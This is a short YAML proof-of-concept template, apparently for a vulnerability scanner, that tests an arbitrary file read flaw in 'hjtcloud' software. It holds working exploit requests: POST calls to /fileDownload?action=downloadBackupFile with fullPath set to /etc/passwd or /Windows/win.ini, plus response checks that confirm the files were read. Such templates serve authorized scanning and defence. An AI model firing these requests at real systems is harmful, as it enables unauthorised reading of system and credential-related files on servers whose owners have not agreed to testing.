name: poc-yaml-hjtcloud-arbitrary-file-read
groups:
  Linux:
    - method: POST
      path: /fileDownload?action=downloadBackupFile
      follow_redirects: false
      body: |
        fullPath=/etc/passwd
      expression: |
        response.status == 200 && "root".bmatches(response.body)
  Windows:
    - method: POST
      path: /fileDownload?action=downloadBackupFile
      follow_redirects: false
      body: |
        fullPath=/Windows/win.ini
      expression: |
        response.status == 200 && "extensions".bmatches(response.body)

